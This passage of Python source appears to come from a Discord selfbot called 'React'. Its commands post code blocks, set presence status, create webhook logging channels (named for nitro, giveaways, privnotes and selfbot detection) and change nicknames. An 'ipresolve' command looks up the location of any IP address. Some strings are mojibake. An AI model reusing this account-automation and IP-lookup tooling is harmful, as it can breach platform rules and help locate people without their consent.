            resolved_embed.timestamp = embed_timestamp()
            resolved_embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await embed_or_codeblock(ctx, resolved_embed)

    @React.command(usage="clearlog", description="Clears console log")
    async def clearlog(ctx):
        
        if sys.platform == "win32":
            os.system('cls')
        else:
            os.system('clear')
        print('\n')
        print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó'.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù'.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
        print(fg.purple3 + f'‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   \n'.center(shutil.get_terminal_size().columns))

        
        print(fg.purple3)
        
        width = shutil.get_terminal_size().columns

        for i in range(width):
            print('‚îÄ', end='')

        print('\n')

    @React.command(usage="ascii <Text>", description="Shows text in ASCII format")
    async def ascii(ctx, *, text: str):
        if text is None:
            
            return
        else:
            resp = requests.get(f'https://artii.herokuapp.com/make?text={urllib.parse.quote(text)}')
            j = resp.text
            try:
                await ctx.send(f'```{j}```')
            except discord.HTTPException:
                return
            
    # @React.command()
    # async def emojitext(ctx, *, text: str):
    #     if text is None:
            
    #         return
    #     else:
    #         resp = requests.get(f'https://artii.herokuapp.com/make?text={urllib.parse.quote(text)}')
    #         j = resp.text
    #         try:
    #             new_thing = ""
    #             for c in j:
    #                 if c is not "_" and c is not "|":
    #                     new_thing += c
    #                 else:
    #                     new_thing += "ü•µ"
    #             await ctx.send(f'{new_thing}')
    #         except discord.HTTPException:
    #             return
            
    @React.command(usage="cpp <Code>", description="C++ code block")
    async def cpp(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```cpp
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
    
    @React.command(usage="cs <Code>", description="C-Sharp code block")
    async def cs(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```cs
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="css <Code>", description="CSS code block")
    async def css(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```css
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="_json <Code>", description="JSON code block")
    async def _json(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```json
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="py <Code>", description="Python code block")
    async def py(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```py
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="java <Code>", description="Java code block")
    async def java(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```java
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="lua <Code>", description="Lua code block")
    async def lua(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```lua
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="php <Code>", description="php code block")
    async def php(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```php
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="html <Code>", description="HTML code block")
    async def html(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```html
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="yaml <Code>", description="YAML code block")
    async def yaml(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```yaml
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="ini <Code>", description="INI code block")
    async def ini(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```ini
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="rust <Code>", description="Rust code block")
    async def rust(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```rust
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="asciidoc <Code>", description="Asciidoc code block")
    async def asciidoc(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```asciidoc
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="ahk <Code>", description="Autohotkey code block")
    async def ahk(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```autohotkey
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="coffeescript <Code>", description="CoffeeScript code block")
    async def coffeescript(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```coffeescript
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return
    
    @React.command(usage="diff <Code>", description="Diff code block")
    async def diff(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```diff
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="fix <Code>", description="Fix code block")
    async def fix(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```fix
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="ml <Code>", description="ML code block")
    async def ml(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```ml
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="prolog <Code>", description="Prolog code block")
    async def prolog(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```prolog
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="xl <Code>", description="XL code block")
    async def xl(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```xl
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="ruby <Code>", description="Ruby code block")
    async def ruby(ctx, *, code: str):
        try:
            await ctx.send(f'''
                            ```ruby
{code}
                            ```
                            ''')
        except discord.HTTPException:
            return

    @React.command(usage="xml <Code>", description="XML code block")
    async def xml(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```xml
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="swift <Code>", description="Swift code block")
    async def swift(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```swift
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="sql <Code>", description="SQL code block")
    async def sql(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```sql
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="matlab <Code>", description="Matlab code block")
    async def matlab(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```matlab
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="bash <Code>", description="Bash code block")
    async def bash(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```bash
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="go <Code>", description="Go code block")
    async def go(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```go
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="http <Code>", description="HTTP code block")
    async def http(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```http
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="perl <Code>", description="Perl code block")
    async def perl(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```perl
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="elixir <Code>", description="Elixir code block")
    async def elixir(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```elixir
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return
            
    @React.command(usage="js <Code>", description="JavaScript code block")
    async def js(ctx, *, code: str):
        if code is None:
            
            return
        else:
            try:
                await ctx.send(f'''
                                ```js
{code}
                                ```
                                ''')
            except discord.HTTPException:
                return

    @React.command(usage="ipresolve <IP Address>", description="Resolves an IP Address")
    async def ipresolve(ctx, ip: str):
        try:
            if ip is not None:
                le_resp = requests.get(f'http://ip-api.com/json/{urllib.parse.quote(ip)}')
                j = le_resp.json()
                if True:
                    embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"IP Information", timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.add_field(name=f'__üì° IP Address__', value=f'{ip} ', inline=True)
                    embed.add_field(name=f'__üè† City__', value=f'{str(j["city"] if j["city"] else "None")} ', inline=True)
                    embed.add_field(name=f'__üèû Region__', value=f'{str(j["regionName"] if j["regionName"] else "None")} ', inline=True)
                    embed.add_field(name=f'__üèî Country__', value=f'{str(j["country"] if j["country"] else "None")} ', inline=True)
                    embed.add_field(name=f'__üéé Country Code__', value=f'{str(j["countryCode"] if j["countryCode"] else "None")} ', inline=True)
                    embed.add_field(name=f'__‚úâÔ∏è Postal Code__', value=f'{str(j["zip"] if j["zip"] else "None")} ', inline=True)
                    embed.add_field(name=f'__üó∫ Latitude__', value=f'{str(j["lat"] if j["lat"] else "None")} ', inline=True)
                    embed.add_field(name=f'__üó∫ Longitude__', value=f'{str(j["lon"] if j["lon"] else "None")} ', inline=True)
                    embed.add_field(name=f'__‚è± Timezone__', value=f'{str(j["timezone"] if j["timezone"] else "None")} ', inline=True)
                    embed.add_field(name=f'__‚ôü Organization__', value=f'{str(j["org"] if j["org"] else "None")} ', inline=True)
                    embed.add_field(name=f'__üßø ISP__', value=f'{str(j["isp"]) if j["isp"] else "None"}', inline=True)
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    msg = f'''**IP Information**```yaml
IP Address: {ip}
City: {j["city"]}
Region: {j["regionName"]}
Country: {j["country"]}
Country Code: {j["countryCode"]}
Postal Code: {j["zip"]}
Latitude: {j["lat"]}
Longitude: {j["lon"]}
Timezone: {j["timezone"]}
Organization: {j["org"]}
ISP: {j["isp"]}
```'''
                    await ctx.send(msg)
        except Exception:
            pass
        
    @React.command(usage="macresolve <MAC Address>", description="Resolves a MAC Address")
    async def macresolve(ctx, mac: str):
        if mac is None:
            
            return
        else:
            try:
                resp = requests.get(f'https://api.macvendors.com/{urllib.parse.quote(mac)}')
                try:
                    j = resp.content
                    if True:
                        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"MAC Information",timestamp=embed_timestamp())
                        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                        embed.add_field(name=f'MAC Address', value=f'{mac}', inline=False)
                        embed.add_field(name=f'MAC Vendor', value=f'{j.decode("ascii")}', inline=False)
                        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                        await embed_or_codeblock(ctx, embed)


                    else:
                        msg = f'''**Mac Information**```yaml
MAC Address: {mac}
MAC Vendor: {j.decode("ascii")}
```'''
                        await ctx.send(msg)
                except discord.HTTPException:
                    return
            except Exception:
                return

    @React.command(usage="playing <Status>", description="Sets your playing status")
    async def playing(ctx, *, status: str):
        if status is None:
            return
        else:
            try:
                game = discord.Game(
                    name=f'{status}'
                )
                await React.change_presence(activity=game)
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Status',timestamp=embed_timestamp())
                embed.add_field(name=f'__üéÆ Playing Status__', value=f"{status}", inline=True)
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                return

    @React.command(usage="streaming <Status>", description="Sets your streaming status")
    async def streaming(ctx, *, status: str):
        if status is None:
            return
        else:
            try:
                await React.change_presence(activity=discord.Streaming(name=status, url=json.load(open('config.json', encoding='utf-8'))['stream_url']))
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Status',timestamp=embed_timestamp())
                embed.add_field(name=f'__üî¥ Streaming Status__', value=f"{status}", inline=True)
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                return

    @React.command(usage="listening <Status>", description="Sets your listening status")
    async def listening(ctx, *, status: str):
        if status is None:
            return
        else:
            try:
                
                await React.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status))
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Status',timestamp=embed_timestamp())
                embed.add_field(name=f'__üéß Listening Status__', value=f"{status}", inline=True)
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                return

    @React.command(usage="watching <Status>", description="Sets your watching status")
    async def watching(ctx, *, status: str):
        if status is None:
            return
        else:
            try:
                await React.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status))
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Status',timestamp=embed_timestamp())
                embed.add_field(name=f'__üï∂ Watching Status__', value=f"{status}", inline=True)
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                return

    @React.command(usage="removestatus", description="Removes your status")
    async def removestatus(ctx):
        try:
            game = discord.Activity(type=-1)
            await React.change_presence(activity=game)
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Status', description="Removed current status.", timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(pass_context=True)
    async def typing(ctx, seconds: int):
        try:
            async with ctx.channel.typing():
                await asyncio.sleep(seconds)
        except Exception:
            return
        
    @React.command(usage="setupwhooks", description="Creates a category, channels, webhooks and saves them to the config")
    async def setupwhooks(ctx):
        try:
            category = await ctx.guild.create_category_channel(name="Webhooks")
            nitro = await category.create_text_channel("nitro")
            giveaways = await category.create_text_channel("giveaways")
            privnotes = await category.create_text_channel("privnotes")
            sbdetection = await category.create_text_channel("sb-detection")
            ghostpings = await category.create_text_channel("ghostpings")
            commands = await category.create_text_channel("command-usage")
            dmdels = await category.create_text_channel("dm-deletions")
            watcher = await category.create_text_channel("watcher")
            server_bans = await category.create_text_channel("bans")
            tickets = await category.create_text_channel("tickets")
            relationships = await category.create_text_channel("relationships")
            role_updates = await category.create_text_channel("role-updates")
            nick_updates = await category.create_text_channel("nick-updates")

            
            wnitro = await nitro.create_webhook(name="Nitro")
            wgiveaways = await giveaways.create_webhook(name="Giiveaways")
            wprivnotes = await privnotes.create_webhook(name="Privnotes")
            wsbdetection = await sbdetection.create_webhook(name="Selfbot Detection")
            wghostpings = await ghostpings.create_webhook(name="Ghostpings")
            wcommands = await commands.create_webhook(name="Command Usage")
            wdmdels = await dmdels.create_webhook(name="DM Deletions")
            wwatcher = await watcher.create_webhook(name="Watcher")
            wserver_bans = await server_bans.create_webhook(name="Server bans")
            wtickets = await tickets.create_webhook(name="Tickets")
            wrelationships = await relationships.create_webhook(name="Relationships")
            wrole_updates = await role_updates.create_webhook(name="Role Updates")
            wnick_updates = await nick_updates.create_webhook(name="Nickname Updates")
            
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
            
            data['nitro_webhook_url'] = wnitro.url
            data['giveaways_webhook_url'] = wgiveaways.url
            data['ghostping_detection_webhook'] = wghostpings.url
            data['privnote_webhook_url'] = wprivnotes.url
            data['command_usage_webhook'] = wcommands.url
            data['dm_delete_notify_webhook_url'] = wdmdels.url
            data['selfbot_detection_webhook'] = wsbdetection.url
            data['server_ban_webhook'] = wserver_bans.url
            data['ticket_webhook_url'] = wtickets.url
            data['watcher_webhook_url'] = wwatcher.url
            data['relationship_webhook_url'] = wrelationships.url
            data['role_update_webhook'] = wrole_updates.url
            data['nickname_update_webhook'] = wnick_updates.url
        
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Webhooks Setup', description="Your webhook channels have been set up and saved to your config.",timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            
        except Exception:
            pass
        
    @React.command(usage="webhook <Name>", description="Creates a webhook")
    async def webhook(ctx, name):
        try:
            whook = await ctx.channel.create_webhook(name=name)
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Webhook', description='Created Webhook', timestamp=embed_timestamp())
            embed.add_field(name = "__üìõ Name__", value = f"{name}", inline = True)
            embed.add_field(name = "__üîó URL__", value = f"{whook.url}", inline = False)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        except Exception:
            pass


    @React.command(usage="invisiblenickname", description="Changes your nickname to invisible letters")
    async def invisiblenickname(ctx):
        try:
            name = ' ·ûµ·ûµ ·ûµ·ûµ ·ûµ·ûµ ·ûµ·ûµ‚Äé'
            await ctx.author.edit(nick=name)
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Invisible Nickname', description="Your nickname is now invisible.",timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except Exception:
            return

    @React.command(usage="junknickname", description="Changes your nickname to junk letters")
    async def junknickname(ctx):
        try:
            
            name = "íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´íê´" 
            await ctx.author.edit(nick=name)
